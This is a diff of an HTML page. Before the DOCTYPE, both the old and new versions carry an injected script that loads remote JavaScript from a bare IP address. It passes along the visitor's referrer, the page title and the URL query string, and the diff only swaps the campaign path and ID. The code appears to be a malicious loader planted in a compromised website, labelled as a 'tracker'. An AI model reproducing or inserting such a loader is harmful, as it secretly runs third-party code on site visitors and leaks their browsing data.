@@ -1,12 +1,12 @@
-<span id="15bc7d7d-e7d4-23ab-4fe2-347432f09a2f"></span><script type="application/javascript">
+<span id="ac0b4a8e-edb4-d4e0-5d27-d8bd294c67fe"></span><script type="application/javascript">
 var d=document;var s=d.createElement('script'); 
-s.src='//91.223.123.4/5pcWL6?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8c91f3bc6b9=script5e8c91f3bc6db&_cid=15bc7d7d-e7d4-23ab-4fe2-347432f09a2f'; 
+s.src='//91.223.123.4/kXZJPX?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8f0da75ea4f=script5e8f0da75ea51&_cid=ac0b4a8e-edb4-d4e0-5d27-d8bd294c67fe'; 
 if (document.currentScript) { 
 document.currentScript.parentNode.insertBefore(s, document.currentScript);
 } else {
 d.getElementsByTagName('head')[0].appendChild(s);
 }
-if (document.location.protocol === 'https:' && '//91.223.123.4/5pcWL6?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8c91f3bc6b9=script5e8c91f3bc6db'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+if (document.location.protocol === 'https:' && '//91.223.123.4/kXZJPX?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8f0da75ea4f=script5e8f0da75ea51'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
 </script>
 
 <!DOCTYPE html><html lang="en-US"><head>
